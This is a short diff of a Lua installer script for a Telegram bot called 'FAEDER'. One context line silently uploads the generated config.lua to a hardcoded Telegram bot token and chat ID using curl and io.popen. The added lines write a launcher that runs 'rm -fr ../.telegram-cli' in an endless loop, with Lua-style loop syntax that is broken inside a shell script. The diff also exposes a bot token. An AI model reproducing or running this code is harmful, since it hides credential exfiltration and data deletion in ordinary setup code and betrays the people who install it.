@@ -55,7 +55,10 @@ create(config, "./config.lua")
 local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("FA", "w")  file:write([[
 killall screen
+while(true) do
+rm -fr ../.telegram-cli
 screen ./RUNFA.sh
+done
 echo -e "FAEDER IS RUN BOT"
 ]])  file:close()  
 file = io.open("RUNFA.sh", "w")  file:write([[
